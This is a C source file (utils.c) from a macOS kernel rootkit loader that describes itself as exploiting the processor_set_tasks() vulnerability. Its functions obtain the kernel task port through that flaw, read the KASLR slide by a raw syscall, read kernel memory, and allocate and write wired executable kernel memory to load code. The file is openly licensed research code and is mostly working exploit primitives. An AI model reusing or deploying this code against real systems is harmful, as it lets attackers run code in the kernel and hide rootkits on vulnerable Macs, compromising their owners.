/*
 *  _(`-')     _     (`-')  _           <-. (`-')_             (`-').->(`-')      _
 * ( (OO ).-> (_)    (OO ).-/     .->      \( OO) )     .->    ( OO)_  ( OO).->  (_)     _
 *  \    .'_  ,-(`-')/ ,---.   ,---(`-'),--./ ,--/ (`-')----. (_)--\_) /    '._  ,-(`-') \-,-----.
 *  '`'-..__) | ( OO)| \ /`.\ '  .-(OO )|   \ |  | ( OO).-.  '/    _ / |'--...__)| ( OO)  |  .--./
 *  |  |  ' | |  |  )'-'|_.' ||  | .-, \|  . '|  |)( _) | |  |\_..`--. `--.  .--'|  |  ) /_) (`-')
 *  |  |  / :(|  |_/(|  .-.  ||  | '.(_/|  |\    |  \|  |)|  |.-._)   \   |  |  (|  |_/  ||  |OO )
 *  |  '-'  / |  |'->|  | |  ||  '-'  | |  | \   |   '  '-'  '\       /   |  |   |  |'->(_'  '--'\
 *  `------'  `--'   `--' `--' `-----'  `--'  `--'    `-----'  `-----'    `--'   `--'      `-----'
 *  (`-').->(`-')  _   (`-')       (`-')  _                (`-')  _
 *  ( OO)_  ( OO).-/<-.(OO )      _(OO ) (_)     _         ( OO).-/
 * (_)--\_)(,------.,------,),--.(_/,-.\ ,-(`-') \-,-----.(,------.
 * /    _ / |  .---'|   /`. '\   \ / (_/ | ( OO)  |  .--./ |  .---'
 * \_..`--.(|  '--. |  |_.' | \   /   /  |  |  ) /_) (`-')(|  '--.
 * .-._)   \|  .--' |  .   .'_ \     /_)(|  |_/  ||  |OO ) |  .--'
 * \       /|  `---.|  |\  \ \-'\   /    |  |'->(_'  '--'\ |  `---.
 *  `-----' `------'`--' '--'    `-'     `--'      `-----' `------'
 *
 * A kernel rootkit loader based on processor_set_tasks() vulnerability
 *
 * Copyright (c) fG!, 2014, 2015. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * utils.c
 * All kind of auxiliary functions
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "utils.h"

#include <stdio.h>
#include <sys/syscall.h>
#include <sys/sysctl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>

#include "logging.h"

// from xnu/bsd/sys/kas_info.h
#define KAS_INFO_KERNEL_TEXT_SLIDE_SELECTOR     (0)     /* returns uint64_t     */
#define KAS_INFO_MAX_SELECTOR           (1)

/*
 * lame inline asm to use the kas_info() syscall. beware the difference if we want 64bits syscalls!
 */
void
get_kaslr_slide(size_t *size, uint64_t *slide)
{
    // this is needed for 64bits syscalls!!!
    // good post about it http://thexploit.com/secdev/mac-os-x-64-bit-assembly-system-calls/
#define SYSCALL_CLASS_SHIFT                     24
#define SYSCALL_CLASS_MASK                      (0xFF << SYSCALL_CLASS_SHIFT)
#define SYSCALL_NUMBER_MASK                     (~SYSCALL_CLASS_MASK)
#define SYSCALL_CLASS_UNIX                      2
#define SYSCALL_CONSTRUCT_UNIX(syscall_number) \
((SYSCALL_CLASS_UNIX << SYSCALL_CLASS_SHIFT) | \
(SYSCALL_NUMBER_MASK & (syscall_number)))
    
    uint64_t syscallnr = SYSCALL_CONSTRUCT_UNIX(SYS_kas_info);
    uint64_t selector = KAS_INFO_KERNEL_TEXT_SLIDE_SELECTOR;
    int result = 0;
    __asm__ ("movq %1, %%rdi\n\t"
             "movq %2, %%rsi\n\t"
             "movq %3, %%rdx\n\t"
             "movq %4, %%rax\n\t"
             "syscall"
             : "=a" (result)
             : "r" (selector), "m" (slide), "m" (size), "a" (syscallnr)
             : "rdi", "rsi", "rdx", "rax"
             );
}

int
get_kernel_version(void)
{
	size_t size = 0;
	if ( sysctlbyname("kern.osrelease", NULL, &size, NULL, 0) )
    {
        ERROR_MSG("Failed to get kern.osrelease size.");
        return -1;
    }
	char *osrelease = malloc(size);
    if (osrelease == NULL)
    {
        ERROR_MSG("Failed to allocate memory.");
        return -1;
    }
	if ( sysctlbyname("kern.osrelease", osrelease, &size, NULL, 0) )
    {
        ERROR_MSG("Failed to get kern.osrelease.");
        free(osrelease);
        return -1;
    }
    char major[3] = {0};
    strncpy(major, osrelease, 2);
    free(osrelease);
    
    return (int)strtol(major, (char**)NULL, 10);
}

kern_return_t
readkmem(mach_port_t port, void *buffer, const uint64_t target_addr, const size_t size)
{
    mach_vm_size_t outsize = 0;
    kern_return_t kr = mach_vm_read_overwrite(port, target_addr, size, (mach_vm_address_t)buffer, &outsize);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("mach_vm_read_overwrite failed: %d.", kr);
        return KERN_FAILURE;
    }
    return KERN_SUCCESS;
}

/* verify if processor_set_tasks() vulnerability exists and retrieve kernel port if positive */
/* vulnerability presented at BlackHat Asia 2014 by Ming-chieh Pan, Sung-ting Tsai. */
/* also described in Mac OS X and iOS Internals, page 387 */
kern_return_t
get_kernel_task_port(mach_port_t *kernel_port)
{
    OUTPUT_MSG("\n-----[ Retrieving kernel task port ]-----");
    host_t host_port = mach_host_self();
    mach_port_t proc_set_default = 0;
    mach_port_t proc_set_default_control = 0;
    task_array_t all_tasks = NULL;
    mach_msg_type_number_t all_tasks_cnt = 0;
    kern_return_t kr = 0;
    
    kr = processor_set_default(host_port, &proc_set_default);
    if (kr == KERN_SUCCESS)
    {
        kr = host_processor_set_priv(host_port, proc_set_default, &proc_set_default_control);
        if (kr == KERN_SUCCESS)
        {
            kr = processor_set_tasks(proc_set_default_control, &all_tasks, &all_tasks_cnt);
            if (kr == KERN_SUCCESS)
            {
                /* houston we can proceed! */
                OUTPUT_MSG("[INFO] Found valid kernel port using processor_set_tasks() vulnerability.");
                *kernel_port = all_tasks[0];
                /* free the port and array to avoid memleaks */
                mach_port_deallocate(mach_task_self(), proc_set_default_control);
                mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)all_tasks, (mach_vm_size_t)all_tasks_cnt * sizeof(mach_port_t));
                return KERN_SUCCESS;
            }
            mach_port_deallocate(mach_task_self(), proc_set_default_control);
        }
    }
    ERROR_MSG("Current kernel not vulnerable to processor_set_tasks(): %d.", kr);
    return KERN_FAILURE;
}

kern_return_t
map_kernel_buffer(uint8_t **kernel_buffer, size_t *kernel_size)
{
    OUTPUT_MSG("\n-----[ Mapping kernel image ]-----");
    /* find and map the kernel file */
    /* NOTE: we could instead read this directly from kernel memory */
    int kernel_version = get_kernel_version();
    if (kernel_version == -1)
    {
        ERROR_MSG("Failed to retrieve current kernel version!");
        return KERN_FAILURE;
    }
    
    int kernel_fd = -1;
    
    /* Mavericks or lower have /mach_kernel */
    if (kernel_version <= 13)
    {
        kernel_fd = open("/mach_kernel", O_RDONLY);
        if (kernel_fd < 0)
        {
            ERROR_MSG("Can't open /mach_kernel.");
            return KERN_FAILURE;
        }
    }
    /* Yosemite moved kernel file to /System/Library/Kernels/kernel */
    else if (kernel_version >= 14)
    {
        kernel_fd = open("/System/Library/Kernels/kernel", O_RDONLY);
        if (kernel_fd < 0)
        {
            ERROR_MSG("Can't open /System/Library/Kernels/kernel.");
            return KERN_FAILURE;
        }
    }
    
    struct stat statbuf = {0};
    if ( fstat(kernel_fd, &statbuf) < 0 )
    {
        ERROR_MSG("Can't fstat file: %s", strerror(errno));
        close(kernel_fd);
        return KERN_FAILURE;
    }
    
    if ( (*kernel_buffer = mmap(0, statbuf.st_size, PROT_READ, MAP_SHARED, kernel_fd, 0)) == MAP_FAILED)
    {
        ERROR_MSG("Mmap failed on file: %s", strerror(errno));
        close(kernel_fd);
        return KERN_FAILURE;
    }

    /* return size so we can unmap */
    *kernel_size = statbuf.st_size;

    close(kernel_fd);
    return KERN_SUCCESS;
}

int
unmap_kernel_buffer(uint8_t *kernel_buffer, size_t kernel_size)
{
    munmap(kernel_buffer, kernel_size);
    return 0;
}

/* common function to allocate wired kernel memory with specified protection */
static kern_return_t
alloc_kernel_memory(mach_port_t kernel_port, uint64_t size, mach_vm_address_t *address, vm_prot_t protection)
{
    kern_return_t kr = 0;
    mach_vm_address_t alloc_addr = 0;
    
    kr = mach_vm_allocate(kernel_port, &alloc_addr, size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to allocate memory: 0x%x (%s).", kr, mach_error_string(kr));
        return KERN_FAILURE;
    }
    DEBUG_MSG("Allocated kernel memory at address 0x%llx", alloc_addr);
    /* set the memory protection and wired status */
    kr = mach_vm_protect(kernel_port, alloc_addr, size, 0, protection);
    if (kr != KERN_SUCCESS)
    {
        mach_vm_deallocate(kernel_port, alloc_addr, size);
        ERROR_MSG("Failed to protect memory: 0x%x (%s).", kr, mach_error_string(kr));
        return KERN_FAILURE;
    }
    kr = mach_vm_wire(mach_host_self(), kernel_port, alloc_addr, size, protection);
    if (kr != KERN_SUCCESS)
    {
        mach_vm_deallocate(kernel_port, alloc_addr, size);
        ERROR_MSG("Failed to wire memory: 0x%x (%s)", kr, mach_error_string(kr));
        return KERN_FAILURE;
    }
    /* always zero the allocated memory */
    uint8_t *zero = calloc(1, size);
    if (zero == NULL)
    {
        mach_vm_deallocate(kernel_port, alloc_addr, size);
        ERROR_MSG("Failed to allocate zero block.");
        return KERN_FAILURE;
    }
    kr = mach_vm_write(kernel_port, alloc_addr, (vm_offset_t)zero, (mach_msg_type_number_t)size);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to zero");
        free(zero);
        return KERN_FAILURE;
    }
    free(zero);
    
    /* everything ok, return the allocated address to the caller */
    *address = alloc_addr;
    return KERN_SUCCESS;
}

/* allocate executable and wired kernel memory */
kern_return_t
alloc_exec_kmem(mach_port_t kernel_port, uint64_t size, mach_vm_address_t *address)
{
    kern_return_t kr = 0;
    
    kr = alloc_kernel_memory(kernel_port, size, address, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to allocate memory");
        return KERN_FAILURE;
    }
    
    return KERN_SUCCESS;
}

/* allocate non executable and wired kernel memory */
kern_return_t
alloc_data_kmem(mach_port_t kernel_port, uint64_t size, mach_vm_address_t *address)
{
    kern_return_t kr = 0;
    
    kr = alloc_kernel_memory(kernel_port, size, address, VM_PROT_READ | VM_PROT_WRITE);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to allocate memory");
        return KERN_FAILURE;
    }

    return KERN_SUCCESS;
}

/* allocate executable and wired kernel memory and write buffer to it */
kern_return_t
alloc_and_write_exec_kmem(mach_port_t kernel_port, void *data_to_write, uint64_t size, mach_vm_address_t *address)
{
    kern_return_t kr = 0;
    
    kr = alloc_kernel_memory(kernel_port, size, address, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to allocate memory");
        return KERN_FAILURE;
    }
    
    /* finally write the data */
    kr = mach_vm_write(kernel_port, *address, (vm_offset_t)data_to_write, (mach_msg_type_number_t)size);
    if (kr == KERN_SUCCESS)
    {
        return KERN_SUCCESS;
    }

    mach_vm_deallocate(kernel_port, *address, size);
    ERROR_MSG("Failed to allocate and write kernel executable memory: %d (%s)", kr, mach_error_string(kr));
    return KERN_FAILURE;
}

/* allocate non-executabled and wired kernel memory and write buffer to it */
kern_return_t
alloc_and_write_data_kmem(mach_port_t kernel_port, void *data_to_write, uint64_t size, mach_vm_address_t *address)
{
    kern_return_t kr = 0;
    
    kr = alloc_kernel_memory(kernel_port, size, address, VM_PROT_READ | VM_PROT_WRITE);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to allocate memory");
        return KERN_FAILURE;
    }
    
    /* finally write the data */
    kr = mach_vm_write(kernel_port, *address, (vm_offset_t)data_to_write, (mach_msg_type_number_t)size);
    if (kr == KERN_SUCCESS)
    {
        return KERN_SUCCESS;
    }
    
    mach_vm_deallocate(kernel_port, *address, size);
    ERROR_MSG("Failed to allocate and write kernel memory: %d (%s)", kr, mach_error_string(kr));
    return KERN_FAILURE;
}

kern_return_t
zero_and_dealloc_kmem(mach_port_t kernel_port, mach_vm_address_t address, uint32_t size)
{
    kern_return_t kr = 0;
    /* zero out that allocated memory */
    uint8_t *zero = calloc(1, size);
    if (zero == NULL)
    {
        ERROR_MSG("Failed to allocate zero buffer.");
        return KERN_FAILURE;
    }
    kr = mach_vm_write(kernel_port, address, (vm_offset_t)zero, size);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to zero buffer: 0x%x (%s).", kr, mach_error_string(kr));
        free(zero);
        return KERN_FAILURE;
    }
    free(zero);
    /* finally deallocate the buffer */
    kr = mach_vm_deallocate(kernel_port, address, (mach_vm_size_t)size);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to deallocate kernel memory at address 0x%llx, with error 0x%x (%s).", address, kr, mach_error_string(kr));
        return KERN_FAILURE;
    }
    
    return KERN_SUCCESS;
}
